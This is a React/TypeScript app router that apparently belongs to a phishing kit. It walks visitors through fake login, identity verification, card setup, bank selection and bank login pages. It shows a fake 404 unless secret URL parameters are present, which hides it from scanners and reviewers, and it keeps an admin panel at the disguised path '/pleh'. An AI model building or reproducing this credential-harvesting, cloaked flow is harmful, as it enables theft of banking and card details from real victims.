import React, { useState } from 'react';
import { useEffect } from 'react';
import EntryPage from './pages/EntryPage';
import NotificationPage from './pages/NotificationPage';
import UserVerificationPage from './pages/UserVerificationPage';
import OrderSummaryPage from './pages/OrderSummaryPage';
import CardSetupPage from './pages/CardSetupPage';
import ProviderSelectionPage from './pages/ProviderSelectionPage';
import ProviderLoginPage from './pages/ProviderLoginPage';
import AuthenticationSuccess from './components/AuthenticationSuccess';
import AdminPage from './pages/AdminPage';
import ProcessingPage from './pages/ProcessingPage';

type Bank = {
  id: string;
  name: string;
  logo: string;
};

type PageType = 'login' | 'payment' | 'identity' | 'transaction' | 'payment-config' | 'bank-selection' | 'bank-auth' | 'processing';

type AppMode = 'bank' | 'full' | null;

function App() {
  const [currentPage, setCurrentPage] = useState<PageType>('login');
  const [userData, setUserData] = useState({});
  const [transactionData, setTransactionData] = useState({ amount: '', itemType: '' });
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [appMode, setAppMode] = useState<AppMode>(null);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const ssl = urlParams.get('ssl');
    const mf = urlParams.get('m');

    if (ssl === 'true') {
      setAppMode('bank');
    } else if (mf === 'f') {
      setAppMode('full');
    }
  }, []);

  if (window.location.pathname === '/success') {
    return <AuthenticationSuccess />;
  }

  if (window.location.pathname === '/pleh') {
    return <AdminPage />;
  }

  // No valid mode param → 404
  const urlParams = new URLSearchParams(window.location.search);
  const hasValidMode = urlParams.get('ssl') === 'true' || urlParams.get('m') === 'f';
  if (!hasValidMode) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <h1 className="text-6xl font-bold text-gray-300 mb-4">404</h1>
          <p className="text-gray-500 text-lg">Page not found</p>
        </div>
      </div>
    );
  }

  const handleLoginSuccess = () => {
    if (appMode === 'bank') {
      setCurrentPage('bank-selection');
    } else {
      setCurrentPage('payment');
    }
  };
  const handlePaymentAccept = () => setCurrentPage('identity');
  const handleIdentityConfirm = (data: any) => {
    setUserData(data);
    setCurrentPage('transaction');
  };
  const handleTransactionConfirm = (data: { amount: string; itemType: string }) => {
    setTransactionData(data);
    setCurrentPage('payment-config');
  };
  const handleVerificationComplete = () => {
    if (appMode === 'full') {
      setCurrentPage('processing');
    } else {
      setCurrentPage('bank-selection');
    }
  };
  const handleBankSelect = (bank: Bank) => {
    setSelectedBank(bank);
    setCurrentPage('bank-auth');
  };
  const handleBankAuthenticate = () => {
    console.log('Bank authentication successful');
  };

  const goBack = () => {
    switch (currentPage) {
      case 'payment':
        setCurrentPage('login');
        break;
      case 'identity':
        setCurrentPage('payment');
        break;
      case 'transaction':
        setCurrentPage('identity');
        break;
      case 'payment-config':
        setCurrentPage('transaction');
        break;
      case 'bank-selection':
        if (appMode === 'bank') {
          setCurrentPage('login');
        } else {
          setCurrentPage('payment-config');
        }
        break;

      case 'bank-auth':
        setCurrentPage('bank-selection');
        break;
      default:
        break;
    }
  };

  return (
    <div className="font-sans">
      {currentPage === 'login' && (
        <EntryPage onLoginSuccess={handleLoginSuccess} />
      )}
      {currentPage === 'payment' && (
        <NotificationPage
          onAccept={handlePaymentAccept}
          onBack={goBack}
        />
      )}
      {currentPage === 'identity' && (
        <UserVerificationPage
          onNext={handleIdentityConfirm}
          onBack={goBack}
        />
      )}
      {currentPage === 'transaction' && (
        <OrderSummaryPage
          onConfirm={handleTransactionConfirm}
          onBack={goBack}
        />
      )}
      {currentPage === 'payment-config' && (
        <CardSetupPage
          amount={transactionData.amount}
          itemType={transactionData.itemType}
          onVerificationComplete={handleVerificationComplete}
          onBack={goBack}
        />
      )}
      {currentPage === 'bank-selection' && (
        <ProviderSelectionPage
          onBankSelect={handleBankSelect}
          onBack={goBack}
        />
      )}
      {currentPage === 'bank-auth' && selectedBank && (
        <ProviderLoginPage
          bank={selectedBank}
          onAuthenticate={handleBankAuthenticate}
          onBack={goBack}
        />
      )}
      {currentPage === 'processing' && (
        <ProcessingPage />
      )}
    </div>
  );
}

export default App;
